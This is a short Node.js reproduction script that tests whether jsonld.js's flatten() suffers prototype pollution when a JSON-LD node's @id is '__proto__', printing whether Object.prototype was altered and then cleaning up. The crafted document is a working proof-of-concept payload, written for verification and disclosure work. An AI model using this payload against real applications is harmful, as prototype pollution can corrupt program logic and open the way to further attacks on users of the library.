// Repro probe: jsonld.js issue #584 - prototype pollution in jsonld.flatten()
// when a node @id is "__proto__".
//
// Claim under test: calling the public jsonld.flatten() on an attacker-controlled
// JSON-LD document writes attacker properties onto Object.prototype.
//
// Run:  node jsonld_584.js
const jsonld = require("jsonld");

(async () => {
  const probe = "http://example.com/polluted";
  delete Object.prototype["@id"];
  delete Object.prototype[probe];

  const doc = {
    "@context": { polluted: probe },
    "@id": "__proto__",
    polluted: "yes",
  };

  await jsonld.flatten(doc);

  console.log("jsonld:", require("jsonld/package.json").version);
  console.log("Object.prototype[@id]     :", JSON.stringify(Object.prototype["@id"]));
  console.log("Object.prototype[polluted]:", JSON.stringify(Object.prototype[probe]));
  console.log("plain {} inherits polluted:", JSON.stringify({}[probe]));
  console.log(
    "VERDICT:",
    Object.prototype[probe] !== undefined ? "POLLUTED (live)" : "not reproduced"
  );

  delete Object.prototype["@id"];
  delete Object.prototype[probe];
})();
